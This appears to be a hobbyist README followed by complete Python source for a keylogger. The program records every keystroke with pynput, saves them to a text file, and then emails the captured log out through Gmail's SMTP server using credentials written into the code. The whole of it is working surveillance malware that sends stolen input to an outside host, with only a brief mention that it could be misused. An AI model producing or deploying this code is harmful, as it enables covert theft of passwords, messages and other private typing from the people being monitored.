# keylogger

Keyloggers are programs that capture your key strokes.
They can be used to keep logs of everything you press on the keyboard but on the 
flip side it can be used for malicious purposes as well.

The keylogger that I've made is a basic keylogger with not much functionality as the ones available in market today.
It captures your keystrokes and saves them in a file "keylogger.txt".

It then sends the contents of the file(i.e. the keystrokes) to your email id.

With some extra lines of code, it can also send the keystrokes at regular intervals.
But that is a project for another time.

I have not made it executable so one has to explicitely call it.

SYNTAX : python keylogger.py

[NOTE: You need to press esc key to exit out the keylogger.]

You need to have pynput , smtplib and ssl installed.

While python comes with the library smtplib and ssl preinstalled.
You can install pynput with :
pip install pynput

from pynput import keyboard
import smtplib,ssl
sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
#prefer using your own email id for receiver's as well.
receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
password = "passcode"              # Enter your Password here
port = 587
message = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs
Text: Keylogs 
"""
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()


def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

def on_key_release(Key):
    #This stops the Listener/Keylogger.
    #You can use any key you like by replacing "esc" with the key of your choice
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
    listener.join()

with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()


context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail,password)
server.sendmail(sender_mail,receiver_mail,message)
print("Email Sent to ",sender_mail)
server.quit()
